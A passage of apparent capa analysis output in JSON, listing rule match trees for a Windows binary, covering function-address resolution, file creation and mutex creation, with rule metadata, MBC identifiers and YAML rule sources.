                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651799273
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799393
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651799393
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802225
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802225
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802289
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802289
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802409
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802409
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802473
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802473
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802537
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802537
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802601
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802601
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651802945
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651802945
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803065
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651803065
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create or open file": {
        "meta": {
          "name": "create or open file",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "joakim@intezer.com"
          ],
          "scopes": {
            "static": "instruction",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Create File"
              ],
              "objective": "File System",
              "behavior": "Create File",
              "method": "",
              "id": "C0016"
            }
          ],
          "references": [],
          "examples": [
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create or open file\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - joakim@intezer.com\r\n    lib: true\r\n    scopes:\r\n      static: instruction\r\n      dynamic: call\r\n    mbc:\r\n      - File System::Create File [C0016]\r\n    examples:\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x401D7E\r\n  features:\r\n    - or:\r\n      - api: CreateFile\r\n      - api: CreateFileEx\r\n      - api: IoCreateFile\r\n      - api: IoCreateFileEx\r\n      - api: ZwOpenFile\r\n      - api: ZwCreateFile\r\n      - api: NtOpenFile\r\n      - api: NtCreateFile\r\n      - api: LZCreateFile\r\n      - api: LZOpenFile\r\n      - api: fopen\r\n      - api: fopen64\r\n      - api: fdopen\r\n      - api: freopen\r\n      - api: open\r\n      - api: openat\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651783689
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651783689
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651784256
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651784256
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651797320
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651797320
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "IoCreateFileEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZCreateFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "LZOpenFile"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fopen64"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fdopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "freopen"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "open"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "openat"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create or open mutex on Windows": {
        "meta": {
          "name": "create or open mutex on Windows",
          "namespace": "host-interaction/mutex",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com",
            "mehunhoff@google.com"
          ],
          "scopes": {
            "static": "instruction",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Create Mutex"
              ],
              "objective": "Process",
              "behavior": "Create Mutex",
              "method": "",
              "id": "C0042"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 01-01.dll_:0x10001010"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create or open mutex on Windows\r\n    namespace: host-interaction/mutex\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n      - mehunhoff@google.com\r\n    scopes:\r\n      static: instruction\r\n      dynamic: call\r\n    mbc:\r\n      - Process::Create Mutex [C0042]\r\n    examples:\r\n      - Practical Malware Analysis Lab 01-01.dll_:0x10001010\r\n  features:\r\n    - or:\r\n      - api: kernel32.OpenMutex\r\n      - api: kernel32.CreateMutex\r\n      - api: kernel32.CreateMutexEx\r\n      - api: ntdll.NtCreateMutant\r\n      - api: ntdll.NtOpenMutant\r\n      - and:\r\n        - format: dotnet\r\n        - or:\r\n          - api: System.Threading.Mutex::ctor\r\n          - api: System.Threading.Mutex::OpenExisting\r\n          - api: System.Threading.Mutex::TryOpenExisting\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651789357
            },
